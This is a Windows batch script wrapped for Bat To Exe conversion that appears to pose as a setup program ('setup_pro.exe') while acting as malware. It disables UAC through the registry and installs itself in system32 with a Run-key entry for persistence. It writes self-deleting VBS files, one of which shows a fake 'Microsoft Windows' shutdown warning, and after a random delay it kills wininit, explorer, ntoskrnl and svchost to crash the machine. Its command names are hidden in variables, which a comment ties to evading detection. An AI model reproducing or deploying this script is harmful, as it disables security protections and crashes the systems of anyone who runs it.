::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCuDJGyX8VAjFDdzczy+GG6pDaET+NR8MxwAaqYh0yrU/VU0X2hupQ/ibZ4ASR/XOfymQkP/8Z6JkS4tmdm9XrrHbbIMwhgbWufdWU2d81sMMkZbqV+JwiI4b7M=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF25
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF25
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpSI=
::dAsiuh18IRvcCxnZtBNQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJheFUEAlXbaTPoSORMuLmb
::ZQ05rAF9IBncCkqN+0xwdVsFHErScjrjU+1Oprmrv7vn
::ZQ05rAF9IAHYFVzEqQIdIRhGQxeNOn8YyPUr4eb/4P2UAINde/I6ao7P07qJYNMK+VHhePY=
::eg0/rx1wNQPfEVWB+kM9LVsJDDenCF6KSJAkzYg=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQIHIRVQQxORfEK0FaEd5OT6++OIrA0cWuZ/S4rPz6Tu
::dhA7uBVwLU+EWHSN91A/OxRSWEShM3mqCacd/OH04Yo=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATEVotwBRJXXguRM22uRpYT+vj0/euTq0ITGqIedIObyL2JKPQAqlfhZpM/wH9e1qs=
::ZQ0/vhVqMQ3MEVWAtB9wBBJAWAiHfEy7CdU=
::Zg8zqx1/OA3MEVWAtB9wBBJAWAiHfEy7CdU=
::dhA7pRFwIByZRRmo/VYkJB4UawWNXA==
::Zh4grVQjdCuDJGyX8VAjFDdzczy+GG6pDaET+NR8MxwAaqYh0yrU/VU0X2hupQ/ibZ4ASR/XOfymQkP/8Z6JkS4ugPCzQIZ+hnaKC9SZpxrxdVib6QU1A2AU
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
::���ý������ȼ�Ϊ"ʵʱ"
wmic process where name='setup_pro.exe' call SetPriority "Realtime"
wmic process where name='cmd.exe' call SetPriority "Realtime"
::����Ҫʹ�õ���������Ϊ����,��ֹ��**������
set t=taskkill
set win=wininit.exe
set to=timeout
set l=del
set r=rd
set g1=reg
set s=start
set m=md
set o=echo
set cp=copy
set docm=svchost.exe
set system=ntoskrnl.exe
set file=explorer.exe
set auto=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
set UHC=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
::����random����,��ȡ120~1320ֱ�ӵ��������
set /a n=%random%%%1200+120
::����random����,��ֹ����Ŀ¼�����ظ�
set /a a=%random%%
set /a b=%random%%
set /a c=%random%%
set /a d=%random%%
set /a e=%random%%
set /a f=%random%%
set /a g=%random%%
set /a h=%random%%
::�޸�ע�����(�ر�UAC)
%g1% add %UHC% /v EnableLUA /t REG_DWORD /d 0 /f
%g1% delete %auto% /v setup /f
::���Ʊ��嵽systen32��,��ͨ���޸�ע������������
%cp% "%~dp0%~nx0" "%windir%\system32\zh-cn"
%g1% add %auto% /v setup /t REG_SZ /d "%windir%\system32\zh-cn\%~nx0" /f
::����vbs�����ű�,������
%o% CreateObject("Scripting.FileSystemObject").DeleteFile(WScript.ScriptFullName) >>%temp%\%a%.%b%.%c%.%d%.%e%.%f%.%g%.%h%.vbs
%o% msg=MsgBox("Power off after %n% seconds",1+15,"Microsoft Windows")>>%temp%\%a%.%b%.%c%.%d%.%e%.%f%.%g%.%h%.vbs
%o% CreateObject("Scripting.FileSystemObject").DeleteFile(WScript.ScriptFullName) >>%temp%\Wait2.vbs
%o% wscript.sleep 1 >>%temp%\Wait2.vbs
start /wait %temp%\Wait2.vbs
%s% %temp%\%a%.%b%.%c%.%d%.%e%.%f%.%g%.%h%.vbs
::ʹ��vbsʵ����ʱִ������
set /a n123=%n%*1000
%o% CreateObject("Scripting.FileSystemObject").DeleteFile(WScript.ScriptFullName) >>%temp%\Wait1.vbs
%o% wscript.sleep %n123% >>%temp%\Wait1.vbs
start /wait %temp%\Wait1.vbs
::���Ĵ���(����ϵͳ������̵���ϵͳ����)
%t% /f /im %win%
%t% /f /im %file%
%o% CreateObject("Scripting.FileSystemObject").DeleteFile(WScript.ScriptFullName) >>%temp%\1Wait.vbs
%o% wscript.sleep 1 >>%temp%\1Wait.vbs
start /wait %temp%\1Wait.vbs
%t% /f /im %system%
%t% /f /im %docm%